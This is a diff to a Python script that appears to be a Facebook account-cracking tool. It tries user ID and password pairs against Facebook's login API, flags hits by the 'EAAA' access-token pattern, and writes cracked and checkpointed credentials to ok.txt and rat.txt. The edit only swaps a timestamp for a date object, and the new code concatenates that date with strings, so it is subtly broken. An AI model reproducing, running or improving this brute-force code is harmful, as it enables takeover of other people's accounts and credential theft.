@@ -8,6 +8,7 @@
 
 try:
 	import os,sys,time,platform,datetime,random,hashlib,re,threading,json,getpass,urllib,cookielib,requests,uuid,string,subprocess
+        from datetime import date
 	from multiprocessing.pool import ThreadPool
 	from requests.exceptions import ConnectionError
 except ImportError:
@@ -38,8 +39,7 @@ except requests.exceptions.ConnectionError:
 	
 ip = requests.get('https://api.ipify.org').text.strip()
 loc = requests.get('https://ipapi.com/ip_api.php?ip=' + ip, headers={'Referer': 'https://ip-api.com/', 'Content-Type': 'application/json; charset=utf-8', 'User-Agent': 'Mozilla/5.0 (Linux; Android 7.1.2; Redmi 4X) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.92 Mobile Safari/537.36'}).json()['country_name'].upper()
-now = datetime.today()
-timestamp = datetime.timestamp(now)
+today = date.today()
 	
 def linex():
 	os.system('echo  "\n ======================================\n" | lolcat -a -d 2 -s 50')
@@ -296,14 +296,14 @@ def crack_select1():
 			if "access_token" in data.text and "EAAA" in data.text:
 				print(" \033[1;32m[EXCELLENT] "+uid+" | "+pass1+"\033[0;97m")
 				ok = open("ok.txt", "a")
-				ok.write(timestamp+" | "+uid+" | "+pass1+"\n")
+				ok.write(today+" | "+uid+" | "+pass1+"\n")
 				ok.close()
 				oks.append(uid+pass1)
 			else:
 				if "www.facebook.com" in data.json()['error_msg']:
 					print(" \033[1;33m[CHECKPOINT] "+uid+" | "+pass1+"\033[0;97m")
 					cp = open("rat.txt", "a")
-					cp.write(timestamp+" | "+uid+" | "+pass1+"\n")
+					cp.write(today+" | "+uid+" | "+pass1+"\n")
 					cp.close()
 					cps.append(uid+pass1)
 				else:
